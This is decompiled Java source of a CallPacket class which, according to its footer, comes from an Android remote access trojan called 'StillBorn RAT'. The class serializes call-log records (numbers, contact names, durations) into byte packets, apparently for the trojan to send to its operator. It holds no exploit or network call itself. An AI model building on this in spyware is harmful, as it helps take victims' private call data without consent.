/*   1:    */ package Packet;
/*   2:    */ 
/*   3:    */ import java.io.Serializable;
/*   4:    */ import java.nio.ByteBuffer;
/*   5:    */ 
/*   6:    */ public class CallPacket
/*   7:    */   implements Packet, Serializable
/*   8:    */ {
/*   9:    */   private static final long serialVersionUID = 3972539952673409279L;
/*  10:    */   private int id;
/*  11:    */   private int type;
/*  12:    */   private long date;
/*  13:    */   private long duration;
/*  14:    */   private int contact_id;
/*  15:    */   private int phoneNumberSize;
/*  16:    */   private String phoneNumber;
/*  17:    */   private int nameSize;
/*  18:    */   private String name;
/*  19:    */   
/*  20:    */   public CallPacket() {}
/*  21:    */   
/*  22:    */   public CallPacket(int id, int type, long date, long duration, int contact_id, String number, String name)
/*  23:    */   {
/*  24: 43 */     this.id = id;
/*  25: 44 */     this.type = type;
/*  26: 45 */     this.date = date;
/*  27: 46 */     this.duration = duration;
/*  28: 47 */     this.contact_id = contact_id;
/*  29: 48 */     this.phoneNumber = number;
/*  30: 49 */     if (this.phoneNumber != null) {
/*  31: 50 */       this.phoneNumberSize = number.length();
/*  32:    */     } else {
/*  33: 52 */       this.phoneNumberSize = 0;
/*  34:    */     }
/*  35: 53 */     this.name = name;
/*  36: 54 */     if (name != null) {
/*  37: 55 */       this.nameSize = name.length();
/*  38:    */     } else {
/*  39: 57 */       this.nameSize = 0;
/*  40:    */     }
/*  41:    */   }
/*  42:    */   
/*  43:    */   public byte[] build()
/*  44:    */   {
/*  45: 61 */     ByteBuffer b = ByteBuffer.allocate(36 + this.phoneNumberSize + this.nameSize);
/*  46: 62 */     b.putInt(this.id);
/*  47: 63 */     b.putInt(this.type);
/*  48: 64 */     b.putLong(this.date);
/*  49: 65 */     b.putLong(this.duration);
/*  50: 66 */     b.putInt(this.contact_id);
/*  51: 67 */     b.putInt(this.phoneNumberSize);
/*  52: 68 */     b.put(this.phoneNumber.getBytes());
/*  53: 69 */     b.putInt(this.nameSize);
/*  54: 70 */     b.put(this.name.getBytes());
/*  55: 71 */     return b.array();
/*  56:    */   }
/*  57:    */   
/*  58:    */   public void parse(byte[] packet)
/*  59:    */   {
/*  60: 75 */     ByteBuffer b = ByteBuffer.wrap(packet);
/*  61: 76 */     this.id = b.getInt();
/*  62: 77 */     this.type = b.getInt();
/*  63: 78 */     this.date = b.getLong();
/*  64: 79 */     this.duration = b.getLong();
/*  65: 80 */     this.contact_id = b.getInt();
/*  66: 81 */     this.phoneNumberSize = b.getInt();
/*  67: 82 */     byte[] tmp = new byte[this.phoneNumberSize];
/*  68: 83 */     b.get(tmp);
/*  69: 84 */     this.phoneNumber = new String(tmp);
/*  70: 85 */     this.nameSize = b.getInt();
/*  71: 86 */     tmp = new byte[this.nameSize];
/*  72: 87 */     b.get(tmp);
/*  73: 88 */     this.name = new String(tmp);
/*  74:    */   }
/*  75:    */   
/*  76:    */   public int getId()
/*  77:    */   {
/*  78: 92 */     return this.id;
/*  79:    */   }
/*  80:    */   
/*  81:    */   public int getType()
/*  82:    */   {
/*  83: 96 */     return this.type;
/*  84:    */   }
/*  85:    */   
/*  86:    */   public long getDate()
/*  87:    */   {
/*  88:100 */     return this.date;
/*  89:    */   }
/*  90:    */   
/*  91:    */   public long getDuration()
/*  92:    */   {
/*  93:104 */     return this.duration;
/*  94:    */   }
/*  95:    */   
/*  96:    */   public int getContact_id()
/*  97:    */   {
/*  98:108 */     return this.contact_id;
/*  99:    */   }
/* 100:    */   
/* 101:    */   public int getPhoneNumberSize()
/* 102:    */   {
/* 103:112 */     return this.phoneNumberSize;
/* 104:    */   }
/* 105:    */   
/* 106:    */   public String getPhoneNumber()
/* 107:    */   {
/* 108:116 */     return this.phoneNumber;
/* 109:    */   }
/* 110:    */   
/* 111:    */   public int getNameSize()
/* 112:    */   {
/* 113:120 */     return this.nameSize;
/* 114:    */   }
/* 115:    */   
/* 116:    */   public String getName()
/* 117:    */   {
/* 118:124 */     return this.name;
/* 119:    */   }
/* 120:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     Packet.CallPacket
 * JD-Core Version:    0.7.0.1
 */